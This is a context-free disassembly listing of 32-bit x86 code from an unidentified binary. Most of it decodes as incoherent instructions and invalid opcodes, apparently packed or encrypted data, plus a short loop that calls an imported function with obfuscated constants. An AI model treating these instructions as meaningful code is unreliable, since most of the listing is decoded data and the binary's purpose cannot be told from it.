  4047ab:	cmp    ah,BYTE PTR [ebx+edx*8+0x66ac4c7f]
  4047b2:	popa   
  4047b3:	int3   
  4047b4:	ins    DWORD PTR es:[edi],dx
  4047b5:	mov    eax,0xe5ba748e
  4047ba:	adc    DWORD PTR [ebx+eiz*4-0x3b],0xa690fb3e
  4047c2:	hlt    
  4047c3:	push   edx
  4047c4:	pop    edi
  4047c5:	fst    QWORD PTR [edx]
  4047c7:	pop    ebx
  4047c8:	or     BYTE PTR [esi-0x1d9f88df],cl
  4047ce:	dec    edx
  4047cf:	xchg   esi,eax
  4047d0:	jno    0x40482b
  4047d2:	dec    eax
  4047d3:	int3   
  4047d4:	dec    ebx
  4047d5:	(bad)  [ebp+0x7a209fff]
  4047db:	inc    eax
  4047dc:	js     0x40481b
  4047de:	ret    0xab06
  4047e1:	adc    al,ch
  4047e3:	fimul  DWORD PTR [ecx-0x2bc8c202]
  4047e9:	mov    DWORD PTR [esi-0x74],ecx
  4047ec:	xor    eax,0xd5e8d79b
  4047f1:	stos   DWORD PTR es:[edi],eax
  4047f2:	adc    eax,DWORD PTR [ecx-0x552200c9]
  4047f8:	dec    ebp
  4047f9:	into   
  4047fa:	or     BYTE PTR [ebx+0xc],al
  4047fd:	push   edx
  4047fe:	pusha  
  4047ff:	es pop ss
  404801:	(bad)  
  404802:	out    0x4d,al
  404804:	pop    ebp
  404805:	and    ebp,esi
  404807:	out    dx,al
  404808:	mov    ds,WORD PTR ds:0x1be0
  40480d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40480e:	lods   al,BYTE PTR ds:[esi]
  40480f:	jmp    0xc5e7b850
  404814:	shl    BYTE PTR [ecx],0xca
  404817:	test   DWORD PTR [edi-0x18],ebp
  40481a:	mov    bh,0x24
  40481c:	sar    BYTE PTR [eax-0x16de07ba],cl
  404822:	fnstcw WORD PTR [ebx]
  404824:	mov    fs,WORD PTR ds:0x80aa9a5c
  40482a:	popa   
  40482b:	lods   al,BYTE PTR ds:[esi]
  40482c:	xor    ah,BYTE PTR [ecx+esi*2+0x29fadfce]
  404833:	pop    esp
  404834:	stos   DWORD PTR es:[edi],eax
  404835:	add    BYTE PTR [ecx],cl
  404837:	retf   
  404838:	(bad)  
  40483b:	test   DWORD PTR [esp+edi*1+0x5bbd65f],ebx
  404842:	stos   DWORD PTR es:[edi],eax
  404843:	repz adc BYTE PTR [ebp+ebx*2+0x11aa8ecf],al
  40484b:	ret    
  40484c:	mov    eax,ds:0x1ef2db0c
  404851:	push   cs
  404852:	and    esi,DWORD PTR [eax-0x2e]
  404855:	cmp    DWORD PTR [edi+0xb4ef94c],esi
  40485b:	sbb    eax,0xa414dbff
  404860:	xchg   esp,eax
  404861:	jns    0x404850
  404863:	dec    edi
  404864:	out    dx,eax
  404865:	in     al,dx
  404866:	(bad)  
  404867:	jmp    0x39978086
  40486c:	push   ecx
  40486d:	or     eax,DWORD PTR [edx-0x23bc1361]
  404873:	pop    es
  404874:	dec    ebx
  404875:	dec    esi
  404876:	aad    0xf3
  404878:	(bad)  
  404879:	pop    ecx
  40487a:	inc    DWORD PTR [ecx-0x32d70ed2]
  404880:	nop
  404881:	(bad)  
  404882:	push   ecx
  404883:	loop   0x404884
  404885:	xor    DWORD PTR [ecx],0x6
  404888:	cmc    
  404889:	push   ss
  40488a:	push   edi
  40488b:	ror    DWORD PTR [edi+0x6e],cl
  40488e:	call   0x81b7b356
  404893:	fdivr  QWORD PTR [esi-0x1c]
  404896:	sbb    DWORD PTR [eax+0x6c8c6f4],0x6e
  40489d:	dec    eax
  40489e:	stc    
  40489f:	dec    ebp
  4048a0:	dec    edi
  4048a1:	sbb    al,0x7f
  4048a3:	xchg   esp,eax
  4048a4:	push   esi
  4048a5:	and    ebx,DWORD PTR [esi+0x466f652f]
  4048ab:	addr16 pushf 
  4048ad:	retf   0x3e5d
  4048b0:	jns    0x4048b6
  4048b2:	dec    ecx
  4048b3:	jmp    0xe2705303
  4048b8:	sub    al,0x54
  4048ba:	inc    eax
  4048bb:	mov    eax,ds:0xc88f56a8
  4048c0:	les    esp,FWORD PTR [ecx+0xb]
  4048c3:	icebp  
  4048c4:	add    esi,DWORD PTR [edi-0x4c3ea728]
  4048ca:	sub    ebx,esp
  4048cc:	jmp    0x404884
  4048ce:	ins    DWORD PTR es:[edi],dx
  4048cf:	jnp    0x404878
  4048d1:	and    ecx,DWORD PTR [edx]
  4048d3:	mov    ah,BYTE PTR [edx-0x5c]
  4048d6:	aad    0x41
  4048d8:	xor    esi,DWORD PTR [edi+0x68891f7f]
  4048de:	aas    
  4048df:	lds    ebx,FWORD PTR [eax+ebp*2]
  4048e2:	jecxz  0x40493e
  4048e4:	pusha  
  4048e5:	xor    al,0xdd
  4048e7:	scas   al,BYTE PTR es:[edi]
  4048e8:	daa    
  4048e9:	and    ecx,DWORD PTR [edi-0x3122075f]
  4048ef:	xor    ch,BYTE PTR [edx+esi*4-0x62]
  4048f3:	dec    edx
  4048f4:	sub    dl,BYTE PTR ds:[ebx-0x3b]
  4048f8:	clc    
  4048f9:	stos   BYTE PTR es:[edi],al
  4048fa:	sub    al,0x9f
  4048fc:	jge    0x404952
  4048fe:	js     0x4048b7
  404900:	jns    0x404904
  404902:	fwait
  404903:	stc    
  404904:	lahf   
  404905:	idiv   BYTE PTR [eax]
  404907:	sub    al,0x1f
  404909:	cmp    eax,0x1a20e1c2
  40490e:	mov    ?,WORD PTR [edi]
  404910:	cmp    ebp,DWORD PTR [ecx+esi*8]
  404913:	inc    edi
  404914:	push   es
  404915:	int    0xbe
  404917:	frstor [ebp-0x449eed09]
  40491d:	pop    esi
  40491e:	scas   al,BYTE PTR es:[edi]
  40491f:	pop    edx
  404920:	xchg   edx,eax
  404921:	int3   
  404922:	lds    edi,FWORD PTR [edi+ebp*2]
  404925:	inc    ebp
  404926:	sub    ebp,esi
  404928:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404929:	int3   
  40492a:	sub    BYTE PTR [edx+ebp*2-0x7b90c06a],al
  404931:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404932:	jno    0x4049aa
  404934:	test   al,0x1e
  404936:	xor    eax,0x300da161
  40493b:	ins    BYTE PTR es:[edi],dx
  40493c:	scas   al,BYTE PTR es:[edi]
  40493d:	jo     0x4048f7
  40493f:	dec    edi
  404940:	leave  
  404941:	pop    edx
  404942:	in     eax,0x2a
  404944:	fstp   st(2)
  404946:	jg     0x4048dd
  404948:	dec    esi
  404949:	sub    al,0x96
  40494b:	jg     0x404918
  40494d:	(bad)  
  40494e:	lods   eax,DWORD PTR ds:[esi]
  40494f:	push   ds
  404950:	mov    dh,0x15
  404952:	and    BYTE PTR [eax+0x2c21711c],ah
  404958:	dec    esi
  404959:	mov    eax,0x792b3424
  40495e:	rcr    esp,0x1d
  404961:	mov    WORD PTR [edx-0x69a93717],es
  404967:	cdq    
  404968:	push   eax
  404969:	call   0xbe9238b
  40496e:	fistp  DWORD PTR [ebx-0x1c]
  404971:	fnstcw WORD PTR [ecx-0x4e5ff28b]
  404977:	ss mov edi,0xd56805f3
  40497d:	mov    dh,0xe3
  40497f:	adc    DWORD PTR [esi+0x27865c9e],0x61
  404986:	mov    al,ds:0xfee22e33
  40498b:	cmp    DWORD PTR [ebx],eax
  40498d:	jmp    0x4049b0
  40498f:	int    0x66
  404991:	jb     0x404920
  404993:	outs   dx,DWORD PTR ds:[esi]
  404994:	pop    edx
  404995:	arpl   WORD PTR [edx-0xda0c56e],cx
  40499b:	add    ah,0x62
  40499e:	leave  
  40499f:	sar    ebx,0x30
  4049a2:	aam    0x40
  4049a4:	repz hlt 
  4049a6:	fist   DWORD PTR [eax]
  4049a8:	hlt    
  4049a9:	shr    DWORD PTR [edi-0x31],0x79
  4049ad:	outs   dx,DWORD PTR ds:[esi]
  4049ae:	push   0x969008e2
  4049b3:	test   eax,0x61dcb9a1
  4049b8:	jns    0x404995
  4049ba:	data16 lods al,BYTE PTR ds:[esi]
  4049bc:	inc    edx
  4049bd:	stos   DWORD PTR es:[edi],eax
  4049be:	add    eax,0x3b07bee2
  4049c3:	pop    ebp
  4049c4:	pushf  
  4049c5:	and    edi,DWORD PTR [edi+0x49]
  4049c8:	out    0x67,eax
  4049ca:	cld    
  4049cb:	jae    0x4049a6
  4049cd:	dec    esp
  4049ce:	add    eax,0xdc98d0b0
  4049d3:	clc    
  4049d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4049d5:	pop    ebp
  4049d6:	pop    esi
  4049d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4049d8:	enter  0x128a,0xb1
  4049dc:	xchg   esi,eax
  4049dd:	bnd js 0x40499e
  4049e0:	ins    DWORD PTR es:[edi],dx
  4049e1:	push   0xffffffe4
  4049e3:	aas    
  4049e4:	ret    0xb94f
  4049e7:	cmp    DWORD PTR [edi+0x56],esp
  4049ea:	cs mov al,0x17
  4049ed:	std    
  4049ee:	xchg   ebx,eax
  4049ef:	xor    dh,BYTE PTR ds:0x529797e
  4049f5:	retf   0x31a0
  4049f8:	test   DWORD PTR [ecx-0x51],esi
  4049fb:	push   esi
  4049fc:	es dec ecx
  4049fe:	xchg   ecx,eax
  4049ff:	mov    eax,0x914e2d31
  404a04:	xor    eax,0x80bb4646
  404a09:	gs jle 0x40499d
  404a0c:	xor    ecx,0x23
  404a0f:	bound  eax,QWORD PTR [esi-0x442da6c7]
  404a15:	rcl    BYTE PTR [esi+0x6cb0bbd6],1
  404a1b:	pop    esi
  404a1c:	sahf   
  404a1d:	sti    
  404a1e:	sbb    eax,0x726e128a
  404a23:	(bad)  
  404a24:	addr16 retf 
  404a26:	stos   BYTE PTR es:[edi],al
  404a27:	retf   0xbc45
  404a2a:	fs adc esp,0x8552a48
  404a31:	mov    ?,WORD PTR [eax+0x4c6f88b2]
  404a37:	mov    ds:0xd0bd15c7,al
  404a3c:	ins    BYTE PTR es:[edi],dx
  404a3d:	sub    al,0x2f
  404a3f:	mov    edx,0xe5b905e2
  404a44:	imul   edx,DWORD PTR [eax],0xc3ce953f
  404a4a:	outs   dx,DWORD PTR ds:[esi]
  404a4b:	je     0x404a93
  404a4d:	mov    ecx,0x7510850
  404a52:	and    DWORD PTR ds:0x42a839,0x0
  404a5c:	mov    esi,DWORD PTR ds:0x42a839
  404a62:	inc    esi
  404a63:	mov    DWORD PTR ds:0x42a839,esi
  404a69:	cmp    DWORD PTR ds:0x42a839,0xd
  404a70:	jne    0x404a9d
  404a76:	push   DWORD PTR [ebp-0x28]
  404a79:	push   0x69d2
  404a7e:	push   0x518b
  404a83:	push   0x83d6
  404a88:	push   0x4eb7
  404a8d:	push   0x680f
  404a92:	push   0x7bad
  404a97:	call   DWORD PTR ds:0x41d188
  404a9d:	cmp    DWORD PTR ds:0x42a839,0xc
  404aa4:	jne    0x404ab7
  404aaa:	mov    esi,DWORD PTR ds:0x42a839
  404ab0:	inc    esi
  404ab1:	mov    DWORD PTR ds:0x42a839,esi
  404ab7:	cmp    DWORD PTR ds:0x42a839,0x16
  404abe:	jb     0x404a5c
  404ac4:	xor    edx,ecx
  404ac6:	sub    esi,DWORD PTR ds:0x42a7fd
  404acc:	mov    esi,0x327298
  404ad1:	jmp    0x404dc1
  404ad6:	enter  0xc53c,0xd1
  404ada:	(bad)  
  404adc:	aam    0xc1
  404ade:	mov    ah,0xf9
  404ae0:	int3   
  404ae1:	push   edx
  404ae2:	dec    ebx
  404ae3:	and    dh,dh
  404ae5:	add    DWORD PTR [esi+0x2e],0x7e4d7878
  404aec:	js     0x404b66
  404aee:	ret    
  404aef:	xor    DWORD PTR [eax-0x1e],ebp
  404af2:	(bad)  
  404af3:	imul   ecx,DWORD PTR [edx-0x3d],0x216041d
  404afa:	sub    ebx,0x1a
  404afd:	add    eax,0x103b3d07
  404b02:	ret    0xb538
  404b05:	sbb    dl,BYTE PTR [ecx-0x3853c0be]
  404b0b:	and    al,0xde
  404b0d:	cmp    DWORD PTR [ebp-0x5eb6aa6e],0xffffff9e
  404b14:	or     DWORD PTR [ebx-0x2509f2a],ebx
  404b1a:	mov    ebx,0x66140df8
  404b1f:	mov    ds:0xf1dbef17,al
  404b24:	inc    edx
  404b25:	inc    esi
  404b26:	sahf   
  404b27:	outs   dx,BYTE PTR ds:[esi]
  404b28:	popa   
  404b29:	add    ebp,ecx
  404b2b:	push   esp
  404b2c:	dec    ecx
  404b2d:	fcom   DWORD PTR [ecx-0x1a]
  404b30:	das    
  404b31:	daa    
  404b32:	aas    
  404b33:	mov    cl,dl
  404b35:	inc    eax
  404b36:	pop    esi
  404b37:	das    
  404b38:	cmp    BYTE PTR [ebx-0x1d2e7084],0x80
  404b3f:	dec    ecx
  404b40:	mov    cl,0xea
  404b42:	mov    ss,ebp
  404b44:	das    
  404b45:	pusha  
  404b46:	outs   dx,BYTE PTR ds:[esi]
  404b47:	in     eax,0x46
  404b49:	dec    eax
  404b4a:	cmp    BYTE PTR [edx+0x269d3796],al
  404b50:	dec    eax
  404b51:	scas   eax,DWORD PTR es:[edi]
  404b52:	lods   eax,DWORD PTR ds:[esi]
  404b53:	add    al,0x69
  404b55:	out    dx,al
  404b56:	shl    dh,0x27
  404b59:	hlt    
  404b5a:	cli    
  404b5b:	shr    dl,cl
  404b5d:	mov    al,0xcd
  404b5f:	mov    ebp,0x9aaf4cae
  404b64:	into   
  404b65:	jne    0x404b52
  404b67:	or     al,0x76
  404b69:	mov    cl,0xe0
  404b6b:	pop    ebp
  404b6c:	imul   edx,DWORD PTR [esi-0x7e],0x53e79158
  404b73:	(bad)  
  404b74:	jg     0x404b6b
  404b76:	push   esi
  404b77:	mov    ecx,esi
  404b79:	lods   eax,DWORD PTR ds:[esi]
  404b7a:	mov    ch,0xf0
  404b7c:	cmp    DWORD PTR ss:[eax],edi
  404b7f:	in     al,dx
  404b80:	retf   0x57e1
  404b83:	dec    ecx
  404b84:	push   ds
  404b85:	or     DWORD PTR [esi],esi
  404b87:	jl     0x404b5b
  404b89:	ins    DWORD PTR es:[edi],dx
  404b8a:	adc    esi,DWORD PTR [edx-0x7c]
  404b8d:	inc    eax
  404b8e:	cmp    bh,0x4d
  404b91:	sub    eax,0xa29db0ec
  404b96:	repnz scas eax,DWORD PTR es:[edi]
  404b98:	ret    0xa8f3
  404b9b:	cmp    al,0xdd
  404b9d:	mov    ch,0xbf
  404b9f:	hlt    
  404ba0:	mov    al,0x98
  404ba2:	in     al,0xb6
  404ba4:	aaa    
  404ba5:	clc    
  404ba6:	scas   eax,DWORD PTR es:[edi]
  404ba7:	mov    ebx,0xe41822e8
  404bac:	sub    eax,ebx
  404bae:	inc    edi
  404baf:	push   esp
  404bb0:	ja     0x404bb6
  404bb2:	in     eax,dx
  404bb3:	lea    ebx,[eax-0x4c]
  404bb6:	enter  0x6437,0xe9
  404bba:	or     eax,0xad6ae20f
  404bbf:	fimul  WORD PTR [edx]
  404bc1:	ds sub al,0x10
  404bc4:	sbb    BYTE PTR es:[ebp-0x5ae84ce3],0x4a
  404bcc:	adc    eax,0xa46dbcf2
  404bd1:	xchg   esp,eax
  404bd2:	mov    al,ds:0x84fdf474
  404bd7:	iret   
  404bd8:	inc    ecx
  404bd9:	rcr    DWORD PTR [ecx],1
  404bdb:	(bad)  
  404bdc:	(bad)  
  404bde:	or     DWORD PTR [edi],edi
  404be0:	mov    ecx,0x9a7c82ba
  404be5:	or     DWORD PTR [eax-0x8bd5f21],0x4b
  404bec:	sub    BYTE PTR [ebp-0x58132fc1],dl
  404bf2:	and    al,0xbf
  404bf4:	push   0x6aa1821
  404bf9:	sbb    BYTE PTR [esi],bl
  404bfb:	ror    eax,1
  404bfd:	jmp    0x404c01
  404bff:	repz jnp 0x404bfe
  404c02:	rcl    BYTE PTR [ebx+0x6],cl
  404c05:	cmp    BYTE PTR [ecx],al
  404c07:	sahf   
  404c08:	mov    edx,0x8ae749ee
  404c0d:	xchg   ecx,eax
  404c0e:	jbe    0x404be8
  404c10:	xor    DWORD PTR [ecx+0x180942bc],esi
  404c16:	jp     0x404c78
  404c18:	and    eax,0xbc2a82d0
  404c1d:	jae    0x404c18
  404c1f:	inc    ebx
  404c20:	pop    edi
  404c21:	aam    0xbd
  404c23:	pop    esi
  404c24:	stc    
  404c25:	xchg   edi,eax
  404c26:	xlat   BYTE PTR ds:[ebx]
  404c27:	jmp    0x404c8f
  404c29:	ror    DWORD PTR [esi+0x47],1
  404c2c:	jecxz  0x404bae
  404c2e:	pop    es
  404c2f:	pop    ds
  404c30:	fdiv   DWORD PTR [edx+0x26]
  404c33:	jb     0x404c83
  404c35:	mov    dh,0xa1
  404c37:	mov    es,WORD PTR [edx]
  404c39:	push   edi
  404c3a:	es mov ch,0xa5
  404c3d:	imul   esp,DWORD PTR [ebp-0x77],0x63
  404c41:	jns    0x404c69
  404c43:	mov    edi,0x2fdb2a1f
  404c48:	clc    
  404c49:	mov    cl,0x1c
  404c4b:	call   0xc621:0x7cdfba75
  404c52:	mov    ebp,0x97dc9e28
  404c57:	test   DWORD PTR [ecx+0x6f],ebx
  404c5a:	add    DWORD PTR [edx],esi
  404c5c:	jno    0x404cdb
  404c5e:	ret    
  404c5f:	mov    ebx,DWORD PTR [esi+0x5b]
  404c62:	out    dx,al
  404c63:	sub    DWORD PTR [edi+0x43],ecx
  404c66:	or     eax,0x1f404f1c
  404c6b:	popf   
  404c6c:	jno    0x404c30
  404c6e:	jmp    0x23c4:0x68f786af
  404c75:	push   es
  404c76:	mov    esi,0xb53e8979
  404c7b:	dec    esi
  404c7c:	and    DWORD PTR [eax+esi*1-0x7786554d],eax
  404c83:	pop    ecx
  404c84:	mov    dl,0xa2
  404c86:	mov    bh,0x65
  404c88:	jmp    0xd2584a
  404c8d:	adc    ah,bh
  404c8f:	xchg   DWORD PTR [eax+edx*1-0x27],eax
  404c93:	add    eax,0x478ff314
  404c98:	xchg   ecx,eax
  404c99:	push   esi
  404c9a:	out    0xa7,eax
  404c9c:	sbb    BYTE PTR [edx+0x1b910e34],ah
  404ca2:	(bad)  
  404ca3:	in     al,0x17
  404ca5:	into   
  404ca6:	push   edx
  404ca7:	retf   
  404ca8:	mov    eax,0xe8f44b2c
  404cad:	push   ebp
  404cae:	cmc    
  404caf:	in     eax,0xb2
  404cb1:	push   esp
  404cb2:	mov    al,ds:0x9b34a739
  404cb7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404cb8:	jbe    0x404ceb
  404cba:	push   ebp
  404cbb:	pushf  
  404cbc:	push   eax
  404cbd:	mov    eax,ds:0x4a06dea3
  404cc2:	push   edx
  404cc3:	adc    DWORD PTR [eax],ecx
  404cc5:	ret    
  404cc6:	repnz outs dx,BYTE PTR ds:[esi]
  404cc8:	sub    DWORD PTR [esi-0x2be77540],esp
  404cce:	bound  esi,QWORD PTR [ecx]
  404cd0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404cd1:	or     eax,ebp
  404cd3:	mov    ebx,0x9941c430
  404cd8:	push   ds
  404cd9:	test   eax,0x505547c2
  404cde:	mov    dh,0xd
  404ce0:	(bad)  
  404ce1:	std    
  404ce2:	clc    
  404ce3:	sub    dh,BYTE PTR [ecx+0x1ba61f21]
  404ce9:	pop    eax
  404cea:	stc    
  404ceb:	adc    DWORD PTR [eax+0x4a1894f3],esp
  404cf1:	xchg   DWORD PTR [edi],esp
  404cf3:	push   0xffffff93
  404cf5:	inc    esp
  404cf6:	mov    ecx,0xb26aad18
  404cfb:	mov    cs,WORD PTR [edi+0xb]
  404cfe:	loope  0x404ce3
  404d00:	(bad)
  404d03:	pop    ecx
  404d04:	leave  
  404d05:	jmp    0x8c93:0xf9ab9c5d
  404d0c:	jb     0x404cc6
  404d0e:	scas   al,BYTE PTR es:[edi]
  404d0f:	lahf   
  404d10:	add    al,0x43
  404d12:	pop    es
  404d13:	jns    0x404d16
  404d15:	or     dl,al
  404d17:	pop    edi
  404d18:	ja     0x404d05
  404d1a:	push   edi
  404d1b:	xchg   edx,eax
  404d1c:	jg     0x404cf1
  404d1e:	add    BYTE PTR [ecx+0x2b],dh
  404d21:	cld    
  404d22:	cmp    eax,0x3306f089
  404d27:	xchg   edi,eax
  404d28:	push   cs
  404d29:	mov    DWORD PTR [eax-0x21a911dc],edx
  404d2f:	inc    eax
  404d30:	mov    al,ds:0x336d2a62
  404d35:	xchg   ebp,eax
  404d36:	sub    bh,0xcf
  404d39:	loop   0x404d61
  404d3b:	inc    ebx
  404d3c:	push   esi
  404d3d:	mov    ecx,0x608b567a
  404d42:	pop    esi
  404d43:	mov    dl,0xfd
  404d45:	(bad)  
  404d46:	xor    DWORD PTR [ebx],ebx
  404d48:	cs push ds
  404d4a:	jecxz  0x404dba
  404d4c:	aam    0xe0
  404d4e:	call   0x3ffa:0xc55e0e14
  404d55:	mov    ah,0xf3
  404d57:	cdq    
  404d58:	repnz add eax,0xe46cb50b
  404d5e:	gs repz sbb eax,0xdc635402
  404d65:	mov    edx,0xb8296653
  404d6a:	jp     0x404d82
  404d6c:	jbe    0x404d68
  404d6e:	adc    eax,0xefcee7b5
  404d73:	adc    eax,DWORD PTR [ebp+0x52cfd373]
  404d79:	dec    ebp
  404d7a:	jb     0x404d5f
  404d7c:	and    al,0x3b
  404d7e:	fs adc al,0x2f
  404d81:	out    0x71,al
  404d83:	fistp  WORD PTR ds:0xd6906b7f
  404d89:	xchg   edx,eax
  404d8a:	test   al,0xcd
  404d8c:	cmp    BYTE PTR [esi+0x66],0x7a
  404d90:	inc    ebx
  404d91:	xchg   ecx,eax
  404d92:	push   eax
  404d93:	jne    0x404db0
  404d95:	ret    0x45bf
  404d98:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404d99:	sub    eax,DWORD PTR [eax+0x2c45529c]
  404d9f:	test   al,ah
  404da1:	mov    edi,0x5415dde0
  404da6:	leave  
  404da7:	xchg   DWORD PTR [esi-0x55],ebx
  404daa:	inc    esi
  404dab:	and    eax,0xc06a2308
  404db0:	add    DWORD PTR [eax+0x68],eax
  404db3:	lds    ecx,FWORD PTR [ecx]
  404db5:	repz loopne 0x404de1
  404db8:	sub    edx,DWORD PTR [ebx+ebx*4-0x794ea112]
  404dbf:	inc    ecx
  404dc0:	or     DWORD PTR [edi-0x75],edx
  404dc3:	jge    0x404dd5
  404dc5:	add    edx,esi
  404dc7:	cmp    edi,edx
  404dc9:	je     0x405a02
  404dcf:	mov    edx,DWORD PTR [ebp-0x8]
  404dd2:	mov    eax,DWORD PTR [ebp-0x4]
  404dd5:	xor    eax,ecx
  404dd7:	jmp    0x4050c7
  404ddc:	(bad)
  404ddf:	rcl    cl,0xd4
  404de2:	leave  
  404de3:	aad    0x26
  404de5:	xor    dh,BYTE PTR [esp+edx*2]
  404de8:	imul   ebx,edx,0x339b722e
  404dee:	js     0x404e68
  404df0:	dec    ebp
  404df1:	jle    0x404e6b
  404df3:	js     0x404dc9
  404df5:	push   eax
  404df6:	jge    0x404dc1
  404df8:	pop    esp
  404df9:	neg    BYTE PTR [ebp+ebp*1+0x2d422098]
  404e00:	js     0x404db7
  404e02:	dec    eax
  404e03:	mov    WORD PTR [esi+0x1a],fs
  404e06:	add    DWORD PTR [eax],edx
  404e08:	cli    
  404e09:	xor    BYTE PTR [ebx+0x39],bh
  404e0c:	enter  0xb3e7,0xe0
  404e10:	(bad)  
  404e11:	xor    BYTE PTR [edi],ch
  404e13:	rcr    ebx,1
  404e15:	fsubrp st(5),st
  404e17:	add    BYTE PTR [ebp-0x5490ae0a],cl
  404e1d:	int    0x1f
  404e1f:	das    
  404e20:	inc    edi
  404e21:	adc    bl,BYTE PTR [esi]
  404e23:	out    dx,eax
  404e24:	fisub  WORD PTR [ecx+0xa]
  404e27:	dec    edx
  404e28:	repnz inc edx
  404e2a:	inc    edi
  404e2b:	aam    0x63
  404e2d:	or     bh,al
  404e2f:	inc    ah
  404e31:	bound  ebx,QWORD PTR [ebx+0x1c]
  404e34:	clc    
  404e35:	xor    eax,0x3f8d26c3
  404e3a:	hlt    
  404e3b:	pop    edi
  404e3c:	stos   BYTE PTR es:[edi],al
  404e3d:	push   eax
  404e3e:	add    BYTE PTR [eax+0x3e],0x64
  404e42:	iret   
  404e43:	inc    esi
  404e45:	cmp    ebx,DWORD PTR [esi]
  404e47:	and    al,0x60
  404e49:	popf   
  404e4a:	mov    dh,0x7b
  404e4c:	dec    edi
  404e4d:	pop    DWORD PTR [esi+0x69baaab4]
  404e53:	dec    edi
  404e54:	mov    ds:0x39884c63,eax
  404e59:	jmp    0x34d19c74
  404e5e:	mov    cl,0x83
  404e60:	push   es
  404e61:	cmp    ch,BYTE PTR [edx+0x25]
  404e64:	xchg   ebx,eax
  404e65:	sbb    DWORD PTR cs:[ecx+0x3a],ecx
  404e69:	dec    esp
  404e6a:	ret    0x9b44
  404e6d:	sbb    DWORD PTR [ebp-0x873f55a],edi
  404e73:	and    eax,0x44099c66
  404e78:	push   0x8b5dbf78
  404e7d:	or     ebp,DWORD PTR [ebx-0x61]
  404e80:	add    cl,al
  404e82:	icebp  
  404e83:	jnp    0x404e57
  404e85:	push   ss
  404e86:	test   DWORD PTR [eax],0xfc368018
  404e8c:	xor    DWORD PTR [ecx],edx
  404e8e:	sbb    DWORD PTR [ecx-0x1e1e498b],0x4c
  404e95:	aam    0x5e
  404e97:	mov    ds:0xc4b8fba2,al
  404e9c:	push   0x8a9a5876
  404ea1:	imul   edi,ecx,0x78fcb71e
  404ea7:	mov    ecx,0x7b6f89cb
  404eac:	jl     0x404e4c
  404eae:	loope  0x404e6b
  404eb0:	jb     0x404e35
  404eb2:	and    al,0xf5
  404eb4:	(bad)  
  404eb5:	popa   
  404eb6:	mov    al,0x29
  404eb8:	jmp    0x524b:0xc86c784a
  404ebf:	repz in eax,0x7
  404ec2:	pop    edx
  404ec3:	pop    ebx
  404ec4:	gs jnp 0x404ef3
  404ec7:	in     al,0x43
  404ec9:	aam    0xd9
  404ecb:	ss jge 0x404f48
  404ece:	dec    ebx
  404ecf:	and    bl,ah
  404ed1:	pop    ebx
  404ed2:	cmp    DWORD PTR [esi-0x57f252b2],eax
  404ed8:	leave  
  404ed9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404eda:	pop    ecx
  404edb:	sub    eax,0x8012324d
  404ee0:	outs   dx,BYTE PTR ds:[esi]
  404ee1:	push   0xfab445f4
  404ee6:	in     al,0x8
  404ee8:	xlat   BYTE PTR ds:[ebx]
  404ee9:	and    DWORD PTR [esi-0x3a13b4e7],eax
  404eef:	enter  0x3029,0x36
  404ef3:	or     BYTE PTR [ebp-0x45],dh
  404ef6:	(bad)  
  404ef7:	xchg   ebp,eax
  404ef8:	inc    eax
  404ef9:	fcmovb st,st(2)
  404efb:	das    
  404efc:	hlt    
  404efd:	enter  0x4bfe,0x2e
  404f01:	pop    edi
  404f02:	les    edx,FWORD PTR [ebx]
  404f04:	aas    
  404f05:	jl     0x404e8e
  404f07:	imul   esp,DWORD PTR [ebx],0xe9d69e
  404f0d:	sub    edx,DWORD PTR [ebx-0x44]
  404f10:	mov    ds:0xbdb3fc48,eax
  404f15:	pop    edx
  404f16:	and    eax,0xfbda139b
  404f1b:	jns    0x404f9b
  404f1d:	and    BYTE PTR [edx+0x52],0x41
  404f21:	cld    
  404f22:	cs lahf 
  404f24:	test   al,bl
  404f26:	imul   ebx,edi,0xbe560c25
  404f2c:	out    dx,eax
  404f2d:	fcomp  DWORD PTR [ecx-0x11e925c0]
  404f33:	out    dx,al
  404f34:	pusha  
  404f35:	aam    0xdb
  404f37:	cmp    DWORD PTR [edx+0x12],esi
  404f3a:	push   cs
  404f3b:	sbb    BYTE PTR [ecx],bh
  404f3d:	mov    es,WORD PTR [ebp-0x73]
  404f40:	popf   
  404f41:	bound  ebp,QWORD PTR [edx-0x7f]
  404f44:	call   0xf127:0xc1c3dbb8
  404f4b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404f4c:	push   ebx
  404f4d:	jmp    0x404f48
  404f4f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404f50:	or     DWORD PTR ds:0x404105f9,eax
  404f56:	nop
  404f57:	mov    cs,WORD PTR fs:[esi+0x7e998a5]
  404f5e:	rol    DWORD PTR [edi-0x32],cl
  404f61:	fucomi st,st(5)
  404f63:	xlat   BYTE PTR ds:[ebx]
  404f64:	loopne 0x404f83
  404f66:	dec    ebx
  404f67:	inc    ecx
  404f68:	inc    eax
  404f69:	int    0x8e
  404f6b:	jg     0x404fc4
  404f6d:	jle    0x404f91
  404f6f:	push   es
  404f70:	fstp   QWORD PTR [esi+ebp*2+0x5553eb19]
  404f77:	cmp    eax,0x8976a86e
  404f7c:	into   
  404f7d:	aam    0x54
  404f7f:	addr16 push eax
  404f81:	lods   al,BYTE PTR ds:[esi]
  404f82:	into   
  404f83:	(bad)  
  404f84:	addr16 cmc 
  404f86:	bound  ebp,QWORD PTR [ebx+0x7850ae81]
  404f8c:	fnsave [eax-0x24]
  404f8f:	dec    esp
  404f90:	inc    edi
  404f91:	sub    al,bl
  404f93:	add    cl,BYTE PTR [edi-0x10ed9621]
  404f99:	iret   
  404f9a:	pop    edi
  404f9b:	call   0x318b6b29
  404fa0:	add    al,0x45
  404fa2:	dec    esi
  404fa3:	add    DWORD PTR [edi],edx
  404fa5:	aam    0xe9
  404fa7:	dec    edx
  404fa8:	or     BYTE PTR [edx+eiz*2+0x2856eeb4],ch
  404faf:	pop    ss
  404fb0:	and    BYTE PTR ds:0x28490fc6,dh
  404fb6:	xchg   ebx,eax
  404fb7:	pushf  
  404fb8:	cmp    al,0x88
  404fba:	push   0x27
  404fbc:	es jle 0x404fb9
